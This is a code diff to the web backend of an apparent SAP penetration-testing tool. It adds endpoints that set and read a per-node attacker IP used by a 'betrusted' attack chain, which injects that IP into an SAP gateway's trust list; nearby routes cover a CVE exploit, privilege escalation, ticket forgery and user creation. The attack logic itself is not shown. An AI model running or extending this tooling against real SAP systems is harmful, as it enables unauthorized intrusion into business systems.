@@ -2551,6 +2551,9 @@ def create_app(api: SAPMAPApi) -> Bottle:
         "/api/node/<sid>/exploit_cve_2025_31324",
         "/api/node/<sid>/lpe",
         "/api/node/<sid>/betrusted_chain",
+        # NAT escape-hatch override — writes attacker_ip_override on the
+        # node, driving the 10KBLAZE betrusted chain's attacker IP.
+        "/api/node/<sid>/set_attacker_ip",
         "/api/node/<sid>/dpmon_sapstar",
         # Ticket forgery + fanout
         "/api/node/<sid>/forge_ticket",
@@ -8779,8 +8782,11 @@ def create_app(api: SAPMAPApi) -> Bottle:
             return json.dumps({"error": f"Node {sid} not found"})
 
         attacker_ip = data.get("attacker_ip", "").strip()
-        if not attacker_ip:
-            return json.dumps({"error": "attacker_ip is required"})
+        # attacker_ip empty = auto-detect (routing table + sock.getsockname
+        # swap, same as the automated 10KBLAZE chain path).  Operator may
+        # also set it per-node via Set 10KBLAZE Attacker IP; try_betrusted
+        # _chain reads node.attacker_ip_override as a secondary fallback.
+        force_attacker_ip = bool(data.get("force_attacker_ip", False))
 
         if not node.ms_port:
             return json.dumps({"error": "MS internal port not known — run Check MS first"})
@@ -8793,20 +8799,25 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
         def _run():
             try:
+                _ip_desc = attacker_ip or "<auto-detect>"
+                _force_desc = " (force=True)" if force_attacker_ip else ""
                 print(f"[*] {sid}: Running betrusted attack on "
                       f"{node.ip or node.hostname}:{node.ms_port} "
-                      f"→ injecting {attacker_ip} into gateway trust list")
+                      f"→ injecting {_ip_desc} into gateway trust list"
+                      f"{_force_desc}")
                 # try_betrusted_chain keeps the MS connection alive while polling GW
                 ok = sapmap_exploit.try_betrusted_chain(
                     node, api.state,
                     attacker_ip=attacker_ip,
                     nilist_wait=nilist_wait,
                     stop_event=stop_event,
+                    force_attacker_ip=force_attacker_ip,
                 )
                 if stop_event.is_set():
                     pass   # exploit already logged cancellation
                 elif ok:
-                    print(f"[+] {sid}: Gateway now TRUSTED from {attacker_ip} "
+                    print(f"[+] {sid}: Gateway now TRUSTED from "
+                          f"{attacker_ip or 'auto-detected IP'} "
                           f"— GW exploit is available")
                 else:
                     print(f"[-] {sid}: Gateway did not become trusted. "
@@ -8817,6 +8828,85 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
         _bg(key, "Betrusted Attack", _run)
         return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/set_attacker_ip", method="POST")
+    def node_set_attacker_ip(sid):
+        """Persist the operator's 10KBLAZE attacker IP override on
+        the node.  Used when SAPMAP runs behind a SNAT'ing router
+        (VPN / Docker / off-subnet) and the operator knows the IP
+        the TARGET sees them as.
+
+        Body:
+          {
+            "attacker_ip":        "192.168.2.42",  # "" clears the override
+            "force":              true,            # bypass auto-swap in betrusted
+          }
+
+        Returns {ok, attacker_ip, force, nat_warning}.
+        """
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            response.status = 404
+            return json.dumps({"error": "node_not_found",
+                                "message": f"Node {sid} not found"})
+        data = request.json if isinstance(request.json, dict) else {}
+        raw_ip = (data.get("attacker_ip") or "").strip()
+        force = bool(data.get("force", False))
+        # Permissive IPv4 shape check — only validate when non-empty so
+        # a blank value clears the override cleanly.
+        if raw_ip:
+            parts = raw_ip.split(".")
+            if (len(parts) != 4
+                    or not all(p.isdigit() and 0 <= int(p) <= 255
+                                for p in parts)):
+                response.status = 400
+                return json.dumps({
+                    "error": "bad_attacker_ip",
+                    "message": "attacker_ip must be an IPv4 address or empty",
+                })
+        node.attacker_ip_override = raw_ip
+        node.attacker_ip_force = force if raw_ip else False
+        # Diagnostic — if the operator set an IP that's STILL on a
+        # different /24 from the target, warn.  Doesn't block the save;
+        # the operator may have reasons (e.g. jumpbox IP they'll test
+        # from later).
+        host = node.ip or node.hostname or ""
+        warning = ""
+        if raw_ip and host:
+            try:
+                from sap_ms_info_disclosure import subnet_mismatch
+                if subnet_mismatch(raw_ip, host):
+                    warning = (
+                        f"Note: {raw_ip} is still on a different /24 "
+                        f"from target {host}.  Save kept — but double-"
+                        f"check that this really is the IP the target "
+                        f"sees you as.")
+            except Exception:
+                pass
+        return json.dumps({
+            "ok":              True,
+            "sid":             sid,
+            "attacker_ip":     node.attacker_ip_override,
+            "force":           node.attacker_ip_force,
+            "nat_warning":     warning,
+        })
+
+    @app.route("/api/node/<sid>/get_attacker_ip")
+    def node_get_attacker_ip(sid):
+        """Return the per-node 10KBLAZE attacker IP override, if any."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            response.status = 404
+            return json.dumps({"error": "node_not_found",
+                                "message": f"Node {sid} not found"})
+        return json.dumps({
+            "ok":           True,
+            "sid":          sid,
+            "attacker_ip":  getattr(node, "attacker_ip_override", "") or "",
+            "force":        bool(getattr(node, "attacker_ip_force", False)),
+        })
 
     @app.route("/api/node/<sid>/create_user", method="POST")
     def node_create_user(sid):
